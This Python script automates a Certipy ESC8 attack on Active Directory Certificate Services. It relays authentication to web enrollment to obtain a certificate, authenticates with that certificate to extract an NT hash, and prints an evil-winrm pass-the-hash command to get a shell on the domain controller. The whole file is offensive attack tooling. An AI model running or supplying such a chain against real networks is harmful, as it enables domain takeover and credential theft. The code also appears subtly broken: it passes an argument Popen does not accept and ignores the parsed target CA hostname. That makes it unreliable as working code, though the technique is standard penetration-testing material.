import subprocess
import argparse
import re

def relay_certificate(args):
    """Abusing web enrollment for Relay attacks"""
    command = [
        "certipy", "relay",
        "-target", f"http://{args.dc_ip}"
    ]
    
    if args.template:
        command.extend(["-template", args.template])
    
    req = subprocess.Popen(command, capture_output=True, text=True)
    stdout, stderr = req.communicate()
    
    if req.returncode != 0:
        print(f"[!] Error executing certipy relay: {stderr}")
        exit(1)
    
    print(stdout)
    pfx_file_match = re.search(r"Saved certificate and private key to '(.*?\.pfx)'", stdout)
    
    if not pfx_file_match:
        print("[!] Failed to retrieve the .pfx file from the request output.")
        exit(1)
    
    return pfx_file_match.group(1).strip()

def authenticate_with_certificate(pfx_file, dc_ip, choose_identity=0):
    """Authenticate using the certificate."""
    print("[*] Authenticating using the certificate...")
    auth_command = ["certipy", "auth", "-pfx", pfx_file, "-dc-ip", dc_ip]
    
    auth_process = subprocess.Popen(auth_command, capture_output=True, text=True, stdin=subprocess.PIPE)
    stdout, stderr = auth_process.communicate(input=f"{choose_identity}\n")
    
    if auth_process.returncode != 0:
        print(f"[!] Authentication failed: {stderr}")
        exit(1)
    
    print("Authentication Output:")
    print(stdout)
    print(stderr)
    
    nt_hash_match = re.search(r"Got NT hash for .*?: ([a-fA-F0-9]{32})", stdout)
    
    if nt_hash_match:
        nt_hash = nt_hash_match.group(1).strip()
        print(f"[*] NT Hash: {nt_hash}")
        print(f"[>] Run: evil-winrm -i {dc_ip} -H {nt_hash} to get a shell")
    else:
        print("[!] Failed to retrieve NT hash.")

def run_certipy_esc8(args):
    """Main function to run certipy ESC8 exploit automation."""
    print("[*] Running ESC8 attack chain automation")
    pfx_file = relay_certificate(args)
    authenticate_with_certificate(pfx_file, args.dc_ip, args.choose_identity)

def main():
    """Parse arguments and run the automation script."""
    parser = argparse.ArgumentParser(description="Automate Certipy ESC8 Exploit")
    parser.add_argument("-t", "--target", required=True, help="Target CA hostname (e.g., ca.corp.local)")
    parser.add_argument("--template", required=False, help="Certificate template (default: USER or Machine)")
    parser.add_argument("--dc-ip", required=True, help="Domain Controller IP (e.g., 172.16.126.128)")
    parser.add_argument("--choose-identity", type=int, default=0, help="Identity index to use if multiple are found")
    
    args = parser.parse_args()
    run_certipy_esc8(args)

if __name__ == "__main__":
    main()
